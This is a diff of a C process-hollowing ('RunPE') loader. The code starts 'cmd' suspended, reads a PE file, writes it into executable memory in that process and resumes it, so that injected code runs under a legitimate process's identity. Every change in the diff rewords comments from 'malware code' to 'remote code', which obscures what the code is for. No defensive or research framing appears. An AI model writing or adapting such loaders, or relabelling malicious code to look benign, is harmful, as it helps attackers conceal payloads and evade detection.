@@ -18,7 +18,7 @@ void RunPE(const char* path) {
     BOOL bRet = CreateProcessA(NULL, (LPSTR)"cmd", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     /*
-        2. Read malware code
+        2. Read the remote code
     */
     // Read the PE file that will be injected
     HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
@@ -57,7 +57,7 @@ void RunPE(const char* path) {
     }
 
     /*
-        5. write malware code
+        5. Write the remote code
     */
     // Allocate memory for the PE image and write the file header
     PVOID RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -71,7 +71,7 @@ void RunPE(const char* path) {
     }
 
     /*
-        6. resume the suspended process
+        6. Resume the suspended process
     */
     // Set the entry point address of the thread context
     ctx.ContextFlags = CONTEXT_FULL;
@@ -98,11 +98,11 @@ int main(int argc, wchar_t* argv[]) {
     /*
         Step
             1. Create a suspended process
-            2. Read malware code
+            2. Read the remote code
             3. Get the suspended process context and the environment information
             4. Unload the suspended process memory
-            5. write malware code
-            6. resume the suspended process
+            5. Write the remote code
+            6. Resume the suspended process
     */
     RunPE(PATH);
     return 0;
